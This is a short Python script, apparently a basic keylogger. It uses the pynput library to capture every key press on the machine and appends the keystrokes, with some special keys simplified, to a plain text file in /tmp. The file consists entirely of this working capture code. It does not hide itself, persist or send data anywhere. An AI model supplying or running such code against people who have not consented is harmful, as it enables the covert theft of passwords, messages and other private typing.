from pynput.keyboard import Key, Listener
import logging

log_dir = "/tmp/"

def on_press(key):
    #logging.info(str(key))
    
    # Open a file with access mode 'a'
    file_object = open(log_dir + "key_log.txt", 'a')

    if str(key) == "Key.space":
        file_object.write(" ")
    elif str(key) == "Key.enter":
        file_object.write("\n")  
    elif str(key) == "Key.shift":
        file_object.write("") 
    elif str(key) == "Key.backspace":
        file_object.write("") 
    elif str(key) == "Key.cmd":
        file_object.write("") 
    elif str(key) == "Key.tab":
        file_object.write("")                                 
    else:
        file_object.write(str(key).replace('\'', ''))
    # Close the file
    file_object.close()    

with Listener(on_press=on_press) as listener:
    listener.join()
    
